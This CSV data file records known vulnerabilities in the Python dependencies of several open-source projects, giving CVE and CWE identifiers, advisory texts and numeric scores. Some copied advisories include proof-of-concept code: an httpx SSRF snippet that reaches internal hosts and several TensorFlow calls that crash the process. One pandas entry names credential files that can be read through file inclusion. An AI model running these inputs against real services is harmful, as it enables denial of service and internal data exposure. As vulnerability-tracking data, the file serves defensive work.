hhyo_Archery,gunicorn,22.0.0,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
hhyo_Archery,numpy,1.*,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
hhyo_Archery,numpy,1.*,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
hhyo_Archery,numpy,1.*,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
hhyo_Archery,numpy,1.*,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
hhyo_Archery,numpy,1.*,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
hhyo_Archery,numpy,1.*,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
hhyo_Archery,numpy,1.*,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
hhyo_Archery,pandas,1.*,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
hhyo_Archery,pandas,1.*,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
hhyo_Archery,clickhouse-driver,0.*,True,CVE-2020-26759,CWE-120,2021-01-06,clickhouse-driver 0.1.5 版本之前存在一个漏洞，该漏洞允许恶意的 clickhouse 服务器通过构造的服务器响应触发客户端崩溃或执行任意代码。这是由于缓冲区溢出引起的。,1,0
hhyo_Archery,djangorestframework,3.13.1,True,CVE-2024-21520,CWE-79,2024-06-25,<p>Django REST Framework (DRF) 是一个用于构建 Web API 的流行框架。版本 3.15.2 之前的版本存在跨站脚本（XSS）漏洞。问题出现在 `break_long_headers` 模板过滤器中，该过滤器用于将长标头拆分并使用 </p><p> 标签连接，但在此过程中没有对用户输入进行适当的转义或清理。攻击者可以通过注入恶意脚本，将其植入 HTTP 请求头中，当浏览器渲染页面时，脚本会在用户浏览器中执行。</p>,3,0
hhyo_Archery,djangorestframework-simplejwt,5.2.0,True,,CWE-613,2022-11-04,"## Overview
[djangorestframework-simplejwt](https://pypi.org/project/djangorestframework-simplejwt) is an A minimal JSON Web Token authentication plugin for Django REST Framework

Affected versions of this package are vulnerable to Insufficient Session Expiration due to access tokens not expiring.
## Remediation
Upgrade `djangorestframework-simplejwt` to version 5.2.2 or higher.
## References
- [GitHub Commit](https://github.com/jazzband/djangorestframework-simplejwt/commit/6c03c4ea547ce973b16614247cc46cb41bb7223b)
- [GitHub PR](https://github.com/jazzband/djangorestframework-simplejwt/pull/629)
- [GitHub Release](https://github.com/jazzband/djangorestframework-simplejwt/releases/tag/v5.2.2)
",3,2
hhyo_Archery,djangorestframework-simplejwt,5.2.0,True,CVE-2024-22513,CWE-306,2024-03-16,"Simple JWT是Jazzband开源的一个用于 Django REST Framework 的 JSON Web Token 身份验证插件。
Simple JWT 5.3.1版本及之前版本存在安全漏洞，该漏洞源于缺少通过 for_user 方法进行的用户验证检查。攻击者利用该漏洞可以获取敏感信息。",3,1
hhyo_Archery,httpx,,True,,CWE-20,2022-05-13,"## Overview
[httpx](https://pypi.org/project/httpx) is a The next generation HTTP client.

Affected versions of this package are vulnerable to Improper Input Validation due to improper implementation of `httpx.URL().copy_with`, that causes `httpx.Client` and `httpx.Proxy` to parse wrong URL. Exploiting this vulnerability leads to blacklist bypass.

## PoC:

**httpx.Client**

```python
user_input_from_http_request = 'http:////admin-dashboard/secret'
u = httpx.URL(user_input_from_http_request)
assert u.host.lower() != 'admin-dashboard'
resp = httpx.Client(base_url=u).get('/') # SSRF to http://admin-dashboard/secret
print(resp.text) # sensitive data leak
```

**httpx.Proxy**

```python
user_input_from_http_request = 'http://x@//internal-proxy:8082/'
u = httpx.URL(user_input_from_http_request)
assert u.host.lower() != 'internal-proxy'
# httpx.Proxy(u).url.netloc == b'internal-proxy:8082'
resp = httpx.Client(proxies=u).get('/') # will request via http proxy at internal-proxy:8082
```
## Remediation
Upgrade `httpx` to version 0.23.0 or higher.
## References
- [GitHub Commit](https://github.com/encode/httpx/pull/2185/commits/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)
- [GitHub Issue](https://github.com/encode/httpx/issues/2184)
- [GitHub PR](https://github.com/encode/httpx/pull/2185)
",3,0
hhyo_Archery,httpx,,True,CVE-2021-41945,CWE-20,2022-04-28,"Encode OSS httpx是英国Encode OSS公司的一个功能齐全的 HTTP 客户端。提供同步和异步 API，支持 HTTP/1.1 和 HTTP/2。
Encode OSS httpx 1.0.0 版本及其之前版本存在输入验证错误漏洞，该漏洞源于httpx.URL和httpx.Client和httpx.URL.copy_with的函数输入验证不当。",1,2
hhyo_Archery,boto3,,True,,CWE-200,2017-03-10,"## Overview
[`boto3`](https://pypi.python.org/pypi/boto3) is the AWS SDK for Python.

Affected versions of this package are vulnerable to Information Exposure due to logging all of the bytes uploaded when the logger is set to the `INFO` level.

## Remediation
Upgrade `boto3` to version 1.4.5 or higher.

## References
- [GitHub Issue](https://github.com/boto/boto3/issues/1017)
- [GitHub Commit](https://github.com/boto/boto3/commit/5a4396a4e0d1b337c081cb4095e5255da915198e)",4,0
home-assistant_core,certifi,>=2021.5.30,True,CVE-2022-23491,CWE-345,2022-12-07,"Certifi是Certifi开源的一个 Python SSL 证书。
Certifi 2017.11.05到2022.12.07版本存在数据伪造问题漏洞，攻击者利用该漏洞可以从根存储的“TrustCor”中删除根证书。",3,0
home-assistant_core,certifi,>=2021.5.30,True,CVE-2023-37920,CWE-345,2023-07-25,"Certifi是Certifi开源的一个 Python SSL 证书。
Certifi 2023.07.22之前版本存在数据伪造问题漏洞，该漏洞源于e-Tugra的根证书存在安全漏洞。",2,2
home-assistant_core,certifi,>=2021.5.30,True,CVE-2024-39689,CWE-345,2024-07-05,"Certifi是Certifi开源的一个 Python SSL 证书。
Certifi 2024.07.04之前版本存在数据伪造问题漏洞，该漏洞源于存在合规性问题，认可来自GLOBALTRUST的根证书。",3,1
home-assistant_core,urllib3,>=2.0,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
home-assistant_core,urllib3,>=2.0,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
home-assistant_core,urllib3,>=2.0,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
home-assistant_core,urllib3,>=2.0,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
home-assistant_core,sentry-sdk,1.45.1,True,CVE-2024-40647,CWE-200,2024-07-18,"sentry-python是Sentry开源的一个应用程序监控软件的 Python 软件开发工具包。
sentry-python 2.8.0之前版本存在安全漏洞，该漏洞源于环境变量无意暴露在子流程中。",4,0
jumpserver_jumpserver,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
jumpserver_jumpserver,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
jumpserver_jumpserver,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
jumpserver_jumpserver,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
jumpserver_jumpserver,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
jumpserver_jumpserver,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
jumpserver_jumpserver,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
jumpserver_jumpserver,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
mindsdb_mindsdb,joblib,,True,CVE-2022-21797,CWE-94,2022-09-25,"joblib是joblib开源的一组在 Python 中提供轻量级流水线的工具。
joblib package 1.2.0之前的版本存在安全漏洞，该漏洞源于其Parallel()类中的pre_dispatch标志允许攻击者通过eval()语句实现任意代码执行。",1,2
mindsdb_mindsdb,xgboost,,True,,CWE-275,2022-11-01,"## Overview
[xgboost](https://pypi.org/project/xgboost) is a XGBoost Python Package

Affected versions of this package are vulnerable to Insecure Permissions due to workflows running with an extended set of permissions by default.
## Remediation
Upgrade `xgboost` to version 1.7.0 or higher.
## References
- [GitHub Commit](https://github.com/dmlc/xgboost/commit/1082ccd3cc82317da5d546dc0063d1478382180d)
- [GitHub PR](https://github.com/dmlc/xgboost/pull/8267)
- [GitHub Release](https://github.com/dmlc/xgboost/releases/tag/v1.7.0)
",3,2
mindsdb_mindsdb,tensorflow,,True,,CWE-190,2022-05-26,"### Impact
The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).
  
### Patches
We have patched the issue in GitHub commit [3796cc4fcd93ae55812a457abc96dcd55fbb854b](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",3,-2
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37680,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于在受影响的版本中，TFLite 中全连接层的实现易受零错误除法。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37682,CWE-908,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google Tensorflow 存在代码问题漏洞，该漏洞源于产品使用量化的 TFLite 操作使用了未初始化的值。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37687,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于通过在 indices 中具有负值的模型来从堆中读取任意数据。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37683,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37685,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于TensorFlow 可能允许本地经过身份验证的攻击者获取敏感信息，这是由 TFLite 中 expand_dims.cc 中的堆越界读取缺陷引起的。通过发送特制的请求，攻击者可以利用此漏洞读取堆分配数据边界之外的一个元素，并使用此信息对受影响的系统发起进一步攻击。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37689,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，L2NormalizeReduceAxis 运算符的 MLIR 优化存在问题。攻击者可利用该漏洞制作一个 TFLite 模型来触发空指针取消引用，这将导致崩溃和拒绝服务。",2,0
mindsdb_mindsdb,tensorflow,,True,,CWE-354,2022-02-10,"### Impact
The implementation of [`tf.sparse.split`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_split_op.cc#L26-L102) does not fully validate the input arguments. Hence, a malicious user can trigger a denial of service via a segfault or a heap OOB read:

```python
import tensorflow as tf
data = tf.random.uniform([1, 32, 32], dtype=tf.float32)
axis = [1, 2]
x = tf.sparse.from_dense(data)
result = tf.sparse.split(x,3, axis=axis)
```
The code assumes `axis` is a scalar. This is another instance of [TFSA-2021-190](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-190.md) (CVE-2021-41206).

### Patches
We have patched the issue in GitHub commit [61bf91e768173b001d56923600b40d9a95a04ad5](https://github.com/tensorflow/tensorflow/commit/61bf91e768173b001d56923600b40d9a95a04ad5) (merging [#53695](https://github.com/tensorflow/tensorflow/pull/53695)).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/53660).",2,0
mindsdb_mindsdb,tensorflow,,True,,CWE-476 CWE-824,2022-02-10,"### Impact 
The [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. This allows malicious users to read and write outside of bounds of heap allocated data as well as trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures).

This follows after CVE-2021-41208 where these APIs were still vulnerable to multiple security issues.

**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. 
  
These APIs are now deprecated in TensorFlow 2.8. We will remove TensorFlow's boosted trees APIs in subsequent releases.
  
### Patches
We have patched the known issues in multiple GitHub commits.
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

This should allow users to use existing boosted trees APIs for a while until they migrate to [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests), while guaranteeing that known vulnerabilities are fixed.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
These vulnerabilities have been reported by Yu Tian of Qihoo 360 AIVul Team and Faysal Hossain Shezan from University of Virginia. Some of the issues have been discovered internally after a careful audit of the APIs.",1,0
mindsdb_mindsdb,tensorflow,,True,,CWE-190,2022-02-10,"### Impact
The Grappler component of TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) in [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L963-L1035):

```cc
  for (const auto& output_prop : output_props) {
    const PartialTensorShape output_shape(output_prop.shape());
    // ...
  }
```
  
The `output_prop` tensor has a shape that is controlled by user input and this can result in triggering one of the `CHECK`s in the `PartialTensorShape` constructor. This is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).

### Patches
We have patched the issue in GitHub commit [be7b286d40bc68cb0b56f702186cc4837d508058](https://github.com/tensorflow/tensorflow/commit/be7b286d40bc68cb0b56f702186cc4837d508058).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",3,0
mindsdb_mindsdb,tensorflow,,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35935, where `SobolSample` is vulnerable to a denial of service via assumed scalar inputs, was found and fixed.
```python
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

### Patches
We have patched the issue in GitHub commits [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf) and [02400ea266bd811fc016a848445de1bbff3a23a0](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)

The fix will be included in TensorFlow 2.11. We will also cherrypick both commits on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range. TensorFlow 2.7.4 will have the first commit cherrypicked.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
- Kang Hong Jin from Singapore Management University
- Neophytos Christou, Secure Systems Labs, Brown University
- 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
- Pattarakrit Rattankul
",4,-2
mindsdb_mindsdb,tensorflow,,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35991, where `TensorListScatter` and `TensorListScatterV2` crash via non scalar inputs in`element_shape`, was found in eager mode and fixed.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [bf9932fc907aff0e9e8cccf769e8b00d30fd81a1](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul
",4,-2
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41219,CWE-824 CWE-125,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，稀疏矩阵乘法的代码通过绑定对“nullptr”的引用而容易受到未定义行为的影响。",2,0
mindsdb_mindsdb,tensorflow,,True,,CWE-400,2022-05-26,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS). The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is due to an incomplete fix for [CVE-2021-41197](https://security.snyk.io/vuln/?search=CVE-2021-41197).

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.1, 2.7.2, 2.6.4 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b)
- [Tensorflow Advisory](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md)
",2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35965,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于如果为 LowerBound 或 UpperBound 提供了一个空的 sorted_inputs 输入，它会导致 nullptr 取消引用，从而导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29607,CWE-754,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4版本存在代码问题漏洞，该漏洞源于SparseAdd中不完整的验证会导致攻击者可利用该漏洞利用未定义的行为(对空指针进行解引用)，以及写入堆分配数据的边界之外。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37640,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于tensorflow, tensorflow-cpu, tensorflow-gpu中的除以0错误。",3,0
